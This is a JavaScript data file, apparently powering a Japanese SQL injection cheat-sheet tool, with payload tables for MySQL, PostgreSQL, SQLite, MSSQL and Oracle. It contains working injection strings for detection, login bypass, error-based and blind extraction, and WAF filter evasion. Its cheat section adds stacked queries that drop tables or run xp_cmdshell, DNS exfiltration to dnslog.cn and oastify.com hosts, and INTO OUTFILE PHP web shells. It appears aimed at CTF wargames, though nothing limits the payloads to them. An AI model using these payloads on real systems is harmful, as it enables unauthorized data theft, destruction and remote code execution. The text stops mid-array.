const DB = {
  mysql: {
    name: "MySQL / MariaDB",
    version: "version()",
    db: "database()",
    user: "user()",
    info: "concat_ws(0x7c,version(),database(),user())",
    tables: "group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
    tablesAlt: "group_concat(distinct table_name) FROM mysql.innodb_table_stats WHERE database_name=database()",
    tablesAltNote: "MySQL 5.7+。information_schema 拒否時の代替。カラム名は取れない点に注意。",
    cols: "group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name={T}",
    dump1: "group_concat({C1}) FROM {T}{W}",
    dump2: "group_concat(concat_ws(0x3a,{C1},{C2})) FROM {T}{W}",
    rowLimit: "LIMIT {i},1",
    rowLimitNC: "LIMIT 1 OFFSET {i}",
    needsDual: false,
    lengthFn: "LENGTH",
    subFn: "substr",
    asciiFn: "ascii",
    timeIf: "IF(({COND}),SLEEP(5),0)",
    timeAlt: "BENCHMARK(50000000,SHA1(0x41))",
    comments: ["-- -", "#", "/*", ";%00"],
    multirowNote: "group_concat は group_concat_max_len (初期1024) で切れる。長い時は LIMIT {i},1 ループか json_arrayagg (5.7.22+, 1600万文字) を使う。"
  },
  postgres: {
    name: "PostgreSQL",
    version: "version()",
    db: "current_database()",
    user: "current_user",
    info: "version()||0x7C||current_database()||0x7C||current_user",
    tables: "string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
    tablesAlt: "string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'",
    tablesAltNote: "pg_catalog 系テーブルからの代替。",
    cols: "string_agg(column_name,',') FROM information_schema.columns WHERE table_name={T}",
    dump1: "string_agg({C1}::text,',') FROM {T}{W}",
    dump2: "string_agg({C1}||':'||{C2},',') FROM {T}{W}",
    rowLimit: "LIMIT 1 OFFSET {i}",
    rowLimitNC: "LIMIT 1 OFFSET {i}",
    needsDual: false,
    lengthFn: "LENGTH",
    subFn: "substr",
    asciiFn: "ascii",
    timeIf: "(SELECT CASE WHEN ({COND}) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL",
    timeAlt: "(SELECT count(*) FROM generate_series(1,5000000))",
    comments: ["--", "/*"],
    multirowNote: "LIMIT 1 OFFSET {i} で1行ずつ。string_agg で一括も可。"
  },
  sqlite: {
    name: "SQLite",
    version: "sqlite_version()",
    db: "(無し: ファイルDB)",
    user: "(無し)",
    info: "sqlite_version()",
    tables: "group_concat(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'",
    tablesAlt: "group_concat(sql,0x0a) FROM sqlite_master WHERE type='table'",
    tablesAltNote: "sqlite_master.sql に CREATE TABLE 文が丸ごと入っている = カラム名まで一撃。",
    cols: "sql FROM sqlite_master WHERE type='table' AND name={T}",
    dump1: "group_concat({C1}) FROM {T}{W}",
    dump2: "group_concat({C1}||':'||{C2}) FROM {T}{W}",
    rowLimit: "LIMIT 1 OFFSET {i}",
    rowLimitNC: "LIMIT 1 OFFSET {i}",
    needsDual: false,
    lengthFn: "LENGTH",
    subFn: "substr",
    asciiFn: "unicode",
    timeIf: "(SELECT CASE WHEN ({COND}) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END)",
    timeAlt: "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))",
    comments: ["--", "/*"],
    multirowNote: "LIMIT 1 OFFSET {i} で1行ずつ。ascii() が無いので unicode() を使う。"
  },
  mssql: {
    name: "MSSQL (SQL Server)",
    version: "@@version",
    db: "db_name()",
    user: "system_user",
    info: "db_name()+'|'+system_user",
    tables: "string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='dbo'",
    tablesAlt: "string_agg(name,',') FROM sysobjects WHERE xtype='U'",
    tablesAltNote: "sysobjects 系 (旧来型) からの代替。string_agg は 2017+。それ未満は TOP/LIMIT ループ。",
    cols: "string_agg(column_name,',') FROM information_schema.columns WHERE table_name={T}",
    dump1: "(SELECT {C1}+':' FROM {T}{W} FOR XML PATH(''))",
    dump2: "(SELECT {C1}+':'+{C2}+',' FROM {T}{W} FOR XML PATH(''))",
    rowLimit: "TOP 1 {X}",
    rowLimitNC: "TOP 1 {X}",
    needsDual: false,
    lengthFn: "LEN",
    subFn: "substring",
    asciiFn: "ascii",
    timeIf: null,
    comments: ["--", "/*", ";%00"],
    multirowNote: "LIMIT 無し。TOP 1 + WHERE で絞るか FOR XML PATH('') で一括連結。N行目は ROW_NUMBER() OVER() か db_name(N) 的な関数添字を活用。"
  },
  oracle: {
    name: "Oracle",
    version: "banner FROM v$version WHERE ROWNUM=1",
    db: "SYS_CONTEXT('USERENV','CURRENT_SCHEMA')",
    user: "user",
    info: "(SELECT banner FROM v$version WHERE ROWNUM=1)||'|'||user",
    tables: "(SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY 1) FROM user_tables)",
    tablesAlt: "(SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY 1) FROM all_tables WHERE owner='SYSTEM')",
    tablesAltNote: "権限があるなら all_tables の方が広く見える。",
    cols: "(SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY 1) FROM user_tab_columns WHERE table_name={T})",
    dump1: "(SELECT listagg({C1},',') WITHIN GROUP (ORDER BY 1) FROM {T}{W})",
    dump2: "(SELECT listagg({C1}||':'||{C2},',') WITHIN GROUP (ORDER BY 1) FROM {T}{W})",
    rowLimit: "(SELECT {X} FROM {T}{W} WHERE ROWNUM=1)",
    rowLimitNC: "(SELECT {X} FROM {T}{W} WHERE ROWNUM=1)",
    needsDual: true,
    lengthFn: "LENGTH",
    subFn: "substr",
    asciiFn: "ascii",
    timeIf: "(SELECT CASE WHEN ({COND}) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)=1",
    timeAlt: "(SELECT COUNT(*) FROM all_objects a, all_objects b)",
    comments: ["--", "/*"],
    multirowNote: "LIMIT 無し。WHERE ROWNUM=1 で1行目、2行目以降は MINUS か 12c+ なら OFFSET n ROWS FETCH NEXT 1 ROWS ONLY。"
  }
};

const PREFIXES = [
  { v: "", label: "なし (数値型: 1)" },
  { v: "'", label: "シングルクォート (1')" },
  { v: '"', label: "ダブルクォート (1\")" },
  { v: "')", label: "括弧閉じ (1')" },
  { v: "%'", label: "LIKE検索 (a%')" },
  { v: "-1'", label: "負ID+クォート (行消し)" },
  { v: "-1", label: "負ID (行消し・数値)" }
];

const COMMENTS = [
  { v: "-- -", label: "-- - (MySQL/PG/MSSQL/SQLite 安全)" },
  { v: "--", label: "-- (要スペース/改行が後ろに必要な場合あり)" },
  { v: "#", label: "# (MySQLのみ)" },
  { v: "/*", label: "/* ... (全DBMS・閉じ不要は文末のみ)" },
  { v: ";%00", label: ";%00 (Nullバイト・PHP古き良き時代)" },
  { v: "", label: "なし (自分で閉じる)" }
];

const DETECT = [
  { t: "引用符 (基本)", p: "'", n: "SQLエラー表示や画面差分が出るか。500 vs 200 を見る。" },
  { t: "ダブルクォート", p: '"', n: "識別子クォート (`\"col\"`) の文脈で有効な場合がある。" },
  { t: "バックスラッシュ", p: "\\", n: "エスケープ文脈の確認。addslashes の挙動確認にも。" },
  { t: "括弧閉じ", p: "')", n: "WHERE id=('1') 型。')) / \") も試す。" },
  { t: "バッククォート", p: "`", n: "MySQL 識別子。通れば MySQL 確定。" },
  { t: "数値 真偽", p: "1 AND 1=1", n: "数値文脈。1 AND 1=2 と比較して差分あれば注入確定。" },
  { t: "文字列 真偽", p: "1' AND '1'='1", n: "1' AND '1'='2 と対で。エラーなし+差分なら文字列文脈。" },
  { t: "計算確認", p: "2-1", n: "2 が返れば数値がそのまま SQL で評価されている (=1) 。" },
  { t: "時間 MySQL", p: "1' AND SLEEP(5)-- -", n: "5秒遅延 → MySQL。" },
  { t: "時間 MySQL (WAF風)", p: "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -", n: "SLEEP が直接見えるフィルタへの迂回。" },
  { t: "時間 PostgreSQL", p: "1'; SELECT pg_sleep(5)-- -", n: "スタック必要。遅延 → PG。" },
  { t: "時間 MSSQL", p: "1';WAITFOR DELAY '0:0:5'-- -", n: "遅延 → MSSQL。" },
  { t: "時間 Oracle", p: "1' AND 1=(SELECT CASE WHEN 1=1 THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual)-- -", n: "遅延 → Oracle。" },
  { t: "時間 SQLite", p: "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))-- -", n: "数秒固まる → SQLite。" },
  { t: "エラー差分 PG", p: "1' AND (SELECT version())::int=1-- -", n: "エラーメッセージに PostgreSQL x.x と出れば PG確定。" },
  { t: "エラー差分 MSSQL", p: "1' AND 1=CONVERT(int,@@version)-- -", n: "Conversion failed エラー → MSSQL確定。" }
];

const FINGERPRINT = [
  { q: "@@version", d: "MySQL / MSSQL", n: "エラーにならず通る方。" },
  { q: "version()", d: "MySQL / PostgreSQL", n: "" },
  { q: "# コメントが有効", d: "MySQL", n: "他DBMSでは構文エラー。" },
  { q: "sqlite_version()", d: "SQLite", n: "" },
  { q: "current_database()", d: "PostgreSQL", n: "" },
  { q: "db_name()", d: "MSSQL", n: "" },
  { q: "(SELECT banner FROM v$version)", d: "Oracle", n: "user / dual も Oracle 由来。" },
  { q: "1 LIMIT 1", d: "MySQL / PG / SQLite", n: "エラーなら MSSQL / Oracle。" },
  { q: "SELECT TOP 1 1", d: "MSSQL", n: "" },
  { q: "FROM dual が必須", d: "Oracle", n: "リテラルSELECTにdual。" },
  { q: "LEN('ab')", d: "MSSQL", n: "LENGTH は MySQL/PG/SQLite/Oracle。" },
  { q: "'a'+'b'", d: "MSSQL", n: "連結として通る。MySQL では 0 (数値加算)。" },
  { q: "'a'||'b'", d: "PG / SQLite / Oracle", n: "MySQL では OR 扱い (PIPES_AS_CONCAT 未設定)。" },
  { q: "GETDATE()", d: "MSSQL", n: "NOW()=MySQL/PG, SYSDATE=Oracle。" },
  { q: "AND EXP(999)", d: "MySQL", n: "DOUBLE overflow エラーの形でも判別可。" }
];

const AUTHBYPASS = [
  { t: "基本形", p: "' OR 1=1-- -", n: "全文一致。最初に撃つやつ。" },
  { t: "admin指定", p: "admin'-- -", n: "先頭行が admin とは限らない時は ORDER BY/LIMIT と併用。" },
  { t: "引用符閉じ型", p: "' OR '1'='1", n: "コメント不要。末尾の閉じクォートを再利用する形。" },
  { t: "引用符閉じ型2", p: "' or ''='", n: "同上。空文字列一致。" },
  { t: "括弧文脈", p: "') OR ('1'='1", n: "WHERE (id='' and pw='') 型。" },
  { t: "括弧+ダブル", p: "\")) OR ((\"1\"=\"1", n: "" },
  { t: "LIKEで", p: "' or 1 like 1-- -", n: "= がフィルタされる場合。" },
  { t: "二重否定", p: "' or 1 <> 2-- -", n: "= と and/or 検出回避の組み合わせ。" },
  { t: "MySQL 専用", p: "admin' #", n: "# が使えるのは MySQL だけなので指紋にもなる。" },
  { t: "行数制限", p: "' OR 1=1 LIMIT 1-- -", n: "複数ヒットでエラーになる実装向け。" },
  { t: "GBK ワイドバイト", p: "%bf%27 OR 1=1-- -", n: "addslashes + GBK 文字コードの時。" },
  { t: "数値型 ID", p: "0 OR 1=1-- -", n: "id が数値で比較される実装向け。" },
  { t: "UNION で admin 行を捏造", p: "' UNION SELECT 1,'admin','0cc175b9c0f1b6a831c399e269772661'-- -", n: "md5(apples) 等、既知ハッシュを返す行をでっち上げる古典。" },
  { t: "ハッシュ比較には効かない", p: "admin'-- -", n: "パスワードを md5 等で比較 (SELECT * WHERE id=pw双方) する場合はバイパス不能 → データ抽出路線へ。", warn: true }
];

const ERRORS = {
  mysql: [
    { t: "UPDATEXML (5.1+)", p: "1' AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337)-- -", n: "XPATH syntax error: に32文字まで表示。substring で分割。" },
    { t: "EXTRACTVALUE (5.1+)", p: "1' AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~'))-- -", n: "同上。32文字制限。" },
    { t: "FLOOR + GROUP BY (5.x)", p: "1' OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0)-- -", n: "Duplicate entry '~5.7.x~1' for key でリーク。XPATH系が塞がれた時の定番。" },
    { t: "EXP オーバーフロー (5.5~5.7)", p: "1' AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x))-- -", n: "DOUBLE value is out of range。" },
    { t: "GTID_SUBSET (5.6+)", p: "1' AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337)-- -", n: "Malformed GTID set specification エラー。" },
    { t: "JSON_KEYS (5.7+)", p: "1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8)))-- -", n: "Invalid JSON text エラー。" },
    { t: "NAME_CONST (定数のみ)", p: "1' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)-- -", n: "version()/user()/database() 等の引数なし関数のみ。" },
    { t: "32文字分割パターン", p: "1' AND UPDATEXML(1,CONCAT(0x7e,SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,30)),1)-- -", n: "SUBSTR の位置 1→31→61 をずらす。Intruder に流す価値あり。" }
  ],
  postgres: [
    { t: "CAST (基本)", p: "1' AND 1=CAST((SELECT version()) AS INT)-- -", n: "invalid input syntax for integer: \"PostgreSQL ...\" でリーク。" },
    { t: "CAST (:: 構文)", p: "1' AND (SELECT version())::int=1-- -", n: "短い版。" },
    { t: "CAST + 連結", p: "1' AND 1=CAST('~'||(SELECT current_database())||'~' AS NUMERIC)-- -", n: "文字列連結してまとめて取得。" },
    { t: "1行ずつ", p: "1' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) as int) and '1'='1", n: "OFFSET を 0,1,2... と進める。" },
    { t: "query_to_xml (一括)", p: "1' AND 1=CAST((SELECT query_to_xml('select * from users',true,true,''))::text AS INT)-- -", n: "結果全体をXML1行に固めて CAST で吐かせる。LIMIT 地獄からの解放。" }
  ],
  sqlite: [
    { t: "load_extension (条件付き)", p: "1' AND CASE WHEN (SELECT substr(version(),1,1)='3') THEN 1 ELSE load_extension(1) END-- -", n: "真のときのみ not authorized エラー → 真偽がエラー有無で分かる (エラーベース的ブール)。load_extension が有効なビルド限定。" },
    { t: "CAST エラー", p: "1' AND CAST((SELECT sql FROM sqlite_master) AS INT)-- -", n: "ドライバ次第でエラー文に値が出ることがある (通らないことも多い)。" }
  ],
  mssql: [
    { t: "CONVERT (基本)", p: "1' AND 1337=CONVERT(INT,(SELECT '~'+@@version+'~'))-- -", n: "Conversion failed when converting the varchar value でリーク。" },
    { t: "CAST", p: "1' AND 1337=CAST((SELECT db_name()) AS INT)-- -", n: "" },
    { t: "IN で誤変換", p: "1' AND 1337 IN (SELECT ('~'+(SELECT system_user)+'~'))-- -", n: "CONVERT が嫌がられる時。" },
    { t: "1/0 除算エラー", p: "1' AND (SELECT CASE WHEN (SUBSTRING(db_name(),1,1)='m') THEN 1/0 ELSE 1 END)=1-- -", n: "真偽判定 (500/200) 用。" }
  ],
  oracle: [
    { t: "UTL_INADDR", p: "1' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -", n: "ORA-错误にホスト名として値が乗る。パッチ環境では権限不足の可能性。" },
    { t: "CTXSYS.DRITHSX.SN", p: "1' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -", n: "古典的。テキスト索引エラーに値が乗る。" },
    { t: "XMLType (XXE)", p: "1' AND (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://'||(SELECT user FROM dual)||'/\">%remote;]>'),'/l') FROM dual) IS NOT NULL-- -", n: "OOB (外部通信) を伴うので Collaborator と併用。" }
  ]
};

const FILTERS = [
  { id: "space", label: "スペース", desc: "' ' が削除/拒否される" },
  { id: "inline", label: "/* */ 禁止", desc: "インラインコメントが使えない" },
  { id: "comment", label: "行コメント両方 (-- #)", desc: "-- も # も拒否される → 引用符で自分で閉じる / %00" },
  { id: "quote", label: "引用符 ' \"", desc: "クォートがエスケープ/除去 (addslashes等)" },
  { id: "eq", label: "= 禁止", desc: "イコールが拒否される" },
  { id: "andor", label: "and / or", desc: "AND/OR 単語が拒否される" },
  { id: "union", label: "union", desc: "UNION が拒否/削除される" },
  { id: "select", label: "select", desc: "SELECT が拒否/削除される" },
  { id: "comma", label: "カンマ ,", desc: ", が拒否される" },
  { id: "paren", label: "括弧 ( )", desc: "() が拒否される (関数呼び出し不能)" },
  { id: "number", label: "数字", desc: "[0-9] が拒否される" },
  { id: "sleep", label: "sleep", desc: "SLEEP が拒否される (時間盲注用)" },
  { id: "infoschema", label: "information_schema", desc: "スキーマ参照テーブルが拒否される" },
  { id: "substr", label: "substr 系", desc: "substr/substring/mid/left/right が拒否" },
  { id: "ascii", label: "ascii/ord", desc: "ASCII/OR D が拒否される" },
  { id: "if", label: "if(", desc: "IF関数が拒否される" }
];

const PRESETS = [
  { label: "— プリセット —", ids: [] },
  { label: "スペース除去のみ", ids: ["space"] },
  { label: "select+union ブラックリスト (preg)", ids: ["select", "union"] },
  { label: "select+union 削除 (str_replace)", ids: ["select", "union"] },
  { label: "or/and 禁止 (LOS darkelf型)", ids: ["andor"] },
  { label: "カンマ禁止", ids: ["comma"] },
  { label: "引用符エスケープ (addslashes)", ids: ["quote"] },
  { label: "引用符 + = + and/or", ids: ["quote", "eq", "andor"] },
  { label: "コメント・スペース両方禁止 (地獄)", ids: ["space", "comment", "inline"] },
  { label: "数値 + 括弧 + カンマ禁止 (絶望)", ids: ["number", "paren", "comma"] },
  { label: "sleep 禁止", ids: ["sleep"] },
  { label: "info_schema 禁止", ids: ["infoschema"] }
];

const WORD_TABLES = ["users","user","member","members","admin","admins","auth","accounts","flag","flags","secret","secrets","notice","notices","board","boards","memo","memos","notes","prob","probs","problems","challenges","challenge","userinfo","info","articles","letters","inbox","chat","logs","log","comments","emails","config","settings","sqlite_master","mysql.user","sysusers"];
const WORD_COLS = ["id","no","idx","num","seq","pw","passwd","password","user_pw","userpass","pass","user_id","userid","username","user","name","uname","email","useremail","mail","title","subject","content","contents","body","text","writer","author","regdate","reg_date","created_at","updated_at","ip","agent","session","token","flag","secret","key","admin","is_admin","level","grade","type","category","file","filename","filepath","download","view","hit","cnt","count","tel","phone","address","birth","age","sex","gender","comment","reply","code","value","data"];

const SPACES = [
  ["/**/", "インラインコメント (全DBMS)", "最も汎用。コメント自体が禁止だと使えない"],
  ["%09", "タブ", "URLエンコードで送る。MySQL/PG/SQLite で有効なことが多い"],
  ["%0a", "改行 LF", "同上。PHP はクエリ内改行を許す"],
  ["%0b", "垂直タブ", "MySQL で有効"],
  ["%0c", "フォームフィード", "MySQL で有効"],
  ["%0d", "CR", "環境により"],
  ["%a0", "非ブレークスペース", "MySQL + 一部文字セットで有効"],
  ["+", "プラス", "クエリストリング文脈のみ (デコードで空白に)"],
  ["( )", "括弧グルーピング", "substr(x,1,1) 等の式は (and)(select) と並べられる: 1'and(select(1))"]
];

const COMMAS = [
  ["substr(x FROM 1 FOR 1)", "SUBSTR の FROM-FOR 構文", "MySQL / PG / Oracle 対応"],
  ["LIMIT 1 OFFSET 0", "LIMIT のオフセット構文", "LIMIT 0,1 の代替"],
  ["CASE WHEN a THEN b ELSE c END", "IF(a,b,c) の代替", "カンマ不要"],
  ["UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c", "UNION の列挙", "1,2,3 の代替 (列名が被らない)"],
  ["0x616263", "文字列リテラルを hex に", "'abc' の代替。CHAR(97,98) も駆逐"],
  ["POSITION(x IN y)", "LOCATE(x,y) の代替", "MySQL"],
  ["LIMIT 1 OFFSET 1 → N行目", "OFFSET", "N-1 を指定"]
];

const EQS = [
  ["LIKE", "x LIKE 'a%'", "ワイルドカード注意。= の代わりの代表"],
  ["RLIKE / REGEXP", "x RLIKE '^a'", "正規表現。substr 禁止時の盲注の要"],
  ["BETWEEN", "x BETWEEN 'a' AND 'b'", "範囲比較で二分探索も可"],
  ["IN", "x IN ('a','b')", "カンマが使えるなら"],
  ["<> と NOT", "NOT x <> 'a'", "= の否定の否定"],
  ["> <", "ascii(x) > 64", "二分探索そのもの"],
  ["GREATEST / LEAST", "GREATEST(ascii(x),64)=64", "sqlmap between tamper 方式"],
  ["IS NOT NULL", "x IS NOT NULL", "存在確認"]
];

const CONCATS = [
  ["MySQL", "CONCAT(a,':',b) / CONCAT_WS(0x3a,a,b,c)", "group_concat() で行またぎ連結"],
  ["PostgreSQL", "a||':'||b / string_agg(x,',')", ""],
  ["SQLite", "a||':'||b / group_concat(x)", "連結に型注意 (数字は cast)"],
  ["MSSQL", "a+':'+b / (SELECT x+',' FROM t FOR XML PATH(''))", "FOR XML PATH が連結の王者"],
  ["Oracle", "a||':'||b / listagg(x,',') WITHIN GROUP (ORDER BY 1)", ""]
];

const CHEATS = [
  {
    t: "攻略フローチャート (どの技法を選ぶか)",
    k: "flow 手順 進め方",
    d: "<ul><li>① エコー (画面にDBの値が出る) がある → <b>UNION</b></li><li>② エコー無いがエラーメッセージが出る → <b>エラーベース</b></li><li>③ 真偽で画面/コードが変わる → <b>Boolean盲注</b></li><li>④ 何も変わらない → <b>時間盲注</b></li><li>⑤ 外部通信可 → <b>OOB (DNS)</b></li><li>⑥ スタック可 (PG/MSSQL) → <b>全クエリ/RCE</b></li><li>⑦ 入力→別ページで表示 → <b>二次注入</b></li></ul>"
  },
  {
    t: "ORDER BY 句インジェクション",
    k: "order sort 並び替え ソート",
    d: "<code>?order=name</code> のようなソート列指定に注入できる。ここでは UNION は使えないが、<b>並び順の変化</b>や<b>式</b>が差し込める。",
    p: [
      "?order=(CASE WHEN (SUBSTR((SELECT pw FROM users WHERE id='admin'),1,1)='a') THEN id ELSE title END)",
      "?order=if((SELECT substr(pw,1,1) FROM users where id='admin')='a',id,title)",
      "?order=(SELECT version())  (エラー/エコー確認)"
    ]
  },
  {
    t: "LIMIT 句インジェクション",
    k: "limit procedure analyse",
    d: "MySQL 5.5 以前は LIMIT の後に <code>PROCEDURE ANALYSE()</code> を置ける。エコーを1列固定で奪う技。",
    p: ["1 LIMIT 1,1 PROCEDURE ANALYSE()", "1 PROCEDURE ANALYSE((SELECT concat_ws(0x7c,user(),database())),1)  (古いMySQLのみ)"]
  },
  {
    t: "INSERT / UPDATE インジェクション",
    k: "insert update 登録 変更",
    d: "登録フォーム等、VALUES の中に注入される形。<code>閉じ→式→開け直し</code>が基本。",
    p: [
      "a@b.com', (SELECT version()), 'x  (INSERT VALUES 内)",
      "' || (SELECT version()) || '  (PG/SQLite/Oracle)",
      "', pw=(SELECT 'newpass')-- -  (UPDATE SET 内)",
      "x', 0x70617373, 'y  (クォート禁止時は hex)"
    ]
  },
  {
    t: "ヘッダインジェクション (XFF / UA / Referer / Cookie)",
    k: "xff header user-agent referer cookie ip ログ",
    d: "IP 制限やログ保存に <code>$_SERVER['HTTP_X_FORWARDED_FOR']</code> を使う実装は超頻出。XFF に時間盲注を撃つ。",
    p: [
      "X-Forwarded-For: 1' AND SLEEP(5)-- -",
      "X-Forwarded-For: 1' AND (SELECT ASCII(SUBSTR(pw,1,1)) FROM users WHERE id='admin')=97 AND SLEEP(5)-- -",
      "User-Agent: '||(SELECT version())||'  (PG / ログ型SQL)",
      "Cookie: PHPSESSID=abc' OR 1=1-- -"
    ]
  },
  {
    t: "二次注入 (Second-order)",
    k: "second 二次 保存 登録",
    d: "登録時にエスケープされて格納され、<b>後で別クエリに連結される</b>パターン。ユーザー名に <code>admin'-- -</code> を登録してパスワード変更等を狙う。",
    p: ["username: admin'-- -  (→ 後段で SELECT * FROM users WHERE id='admin'-- -' AND ...)"]
  },
  {
    t: "スタックドクエリ対応表",
    k: "stacked スタック ; 複文",
    d: "<ul><li>PostgreSQL / MSSQL: <b>可</b> (ドライバ標準)</li><li>MySQL: PHP の mysqli_multi_query / PDO (エミュレーションON) のみ可。基本は不可</li><li>SQLite: PHP PDO なら可な場合あり</li><li>Oracle: 不可 (PL/SQL ブロック除く)</li></ul>",
    p: ["1'; SELECT pg_sleep(5)-- -  (PG)", "1'; DROP TABLE logs;-- -  (MSSQL)", "1';EXEC master..xp_cmdshell 'whoami'-- -  (MSSQL+RCE)"]
  },
  {
    t: "OOB 帯域外攻撃 (DNS / UNC)",
    k: "oob dns collaborator unc load_file 帯域外",
    d: "応答が全く読めない場合、DNS問い合わせ経由でデータを外に運ぶ。Burp Collaborator / dnslog.cn のサブドメインを仕込む。",
    p: [
      "SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT HEX(user())),'.xxxx.dnslog.cn\\\\a'))  (MySQL×Windows, secure_file_priv空)",
      "1'; use master; exec xp_dirtree '\\\\'+db_name()+'.xxxx.oastify.com\\a';-- -  (MSSQL)",
      "1'; COPY (SELECT '') TO PROGRAM 'nslookup '||current_database()||'.xxxx.oastify.com';-- -  (PG スーパーユーザ)",
      "SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.xxxx.oastify.com') FROM dual  (Oracle)"
    ]
  },
  {
    t: "INTO OUTFILE ウェブシェル",
    k: "outfile dumpfile webshell シェル 書き込み",
    d: "条件: ①FILE権限 ②secure_file_priv が空/対象dir ③Webサーバの書込可能パス。MySQL限定の大技。",
    p: [
      "1' UNION SELECT NULL,'<?php system($_GET[c]);?>',NULL INTO OUTFILE '/var/www/html/s.php'-- -",
      "1' UNION SELECT NULL,NULL,'<?php system($_GET[c]);?>' INTO DUMPFILE 'C:/xampp/htdocs/s.php'-- -",
      "1' UNION SELECT 1,2 INTO OUTFILE '/var/www/html/s.php' FIELDS TERMINATED BY '<?php system($_GET[c]);?>'-- -  (クォート/型問題をFIELDSで迂回)"
    ]
  },
  {
    t: "GBK ワイドバイト (addslashes 無効化)",
    k: "gbk wide ワイドバイト addslashes df bf 文字コード",
    d: "<code>SET NAMES gbk</code> 環境で addslashes されると、<code>%df'</code> の %df%5c が1文字 (連) に化けてクォートが復活する。",
    p: ["?id=1%df' AND 1=1-- -", "?id=1%bf%27 OR 1=1-- -", "?id=1%a1%27 UNION SELECT 1,2,3-- -"]
  },
  {
    t: "バックスラッシュ脱出 (LOS succubus 型)",
    k: "backslash バックスラッシュ succubus \\",
    d: "<code>id='{$id}' and pw='{$pw}'</code> で addslashes されている時、id に <code>\\</code> を入れると id の閉じクォートが食われ、<b>pw の中身が SQL の外</b>に出る。",
    p: ["?id=admin\\&pw=or 1=1-- -  (実クエリ: id='admin\\' and pw='or 1=1-- -')"]
  },
  {
    t: "2パラメータでコメント化 (LOS 型)",
    k: "comment 二個 2つ param パラメータ wolfman",
    d: "入力が2箇所に展開される時、片方で <code>/*</code> を開き、もう片方で閉じる。間の元クエリを丸ごとコメントアウトできる。",
    p: ["?id=admin'/*&pw=*/#  (実クエリ: id='admin'/*' and pw='*/#')"]
  },
  {
    t: "information_schema が使えない時 (MySQL)",
    k: "information_schema 代替 innodb sys join duplicate",
    d: "<ul><li><code>mysql.innodb_table_stats</code> (5.7+): テーブル名までは取れる</li><li><code>sys.x$schema_table_statistics</code> 等 sys スキーマ</li><li>JOIN 自己結合エラーでカラム名を暴く: <code>SELECT * FROM (SELECT * FROM users JOIN users b)a</code> → Duplicate column 'id'</li><li>カラム名なしで中身を抜く: <code>SELECT `2` FROM (SELECT 1,2,3 UNION SELECT * FROM users)x</code></li></ul>",
    p: [
      "1' UNION SELECT 1,(SELECT group_concat(distinct table_name) FROM mysql.innodb_table_stats WHERE database_name=database()),3-- -",
      "1' UNION SELECT * FROM (SELECT * FROM users JOIN users b)a-- -  (カラム名列挙)",
      "1' UNION SELECT NULL,(SELECT `2` FROM (SELECT 1,2,3 UNION SELECT * FROM users)x LIMIT 1,1),NULL-- -  (カラム名なし2列目)"
    ]
  },
  {
    t: "substr / ascii が全滅している時の盲注",
    k: "substr ascii 禁止 like rlike regexp 代替",
    d: "<code>LIKE</code> のワイルドカード <code>%</code> <code>_</code> と <code>RLIKE '^a'</code> の正規表現アンカーで先頭一致を取れば、substr も ascii も不要。",
    p: [
      "1' AND (SELECT pw FROM users WHERE id='admin') LIKE 'a%'-- -",
      "1' AND (SELECT pw FROM users WHERE id='admin') RLIKE '^a'-- -",
      "1' AND (SELECT pw FROM users WHERE id='admin') LIKE 'a__%'-- -  (長さ3確定テク)",
      "hex比較: 1' AND (SELECT HEX(SUBSTR(pw,1,1)) ...) = 0x61  (ascii代替)"
    ]
  },
  {
    t: "数字が使えない時 (true 演算)",
    k: "number 数字 true false lpad",
    d: "MySQL では true=1, false=0。加算で任意の整数を作る。16進リテラル 0x.. の数字も消すなら文字列連結で頑張る。",
    p: ["1' AND SUBSTR(pw,true,true)='a'-- -  (=substr(pw,1,1))", "1' AND (SELECT pw FROM users LIMIT true OFFSET true+true)-- -", "lpad(0x61,true,true)  (= 'a' 先頭1文字)"]
  },
  {
    t: "SLEEP が禁止されている時の遅延",
    k: "sleep benchmark 遅延 heavy 重い get_lock",
    d: "MySQL は代替が豊富。他DBMSは重いクエリ (直積) で遅延を作る。",
    p: [
      "1' AND BENCHMARK(50000000,SHA1(0x41))-- -  (MySQL)",
      "1' AND (SELECT count(*) FROM information_schema.tables A JOIN information_schema.tables B)-- -  (直積, 全DBMS的に応用可)",
      "1' AND GET_LOCK('a',10)-- -  (別コネクションで LOCK 保持が必要)",
      "1' AND (SELECT count(*) FROM generate_series(1,50000000))-- -  (PG)",
      "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))  (SQLite)"
    ]
  },
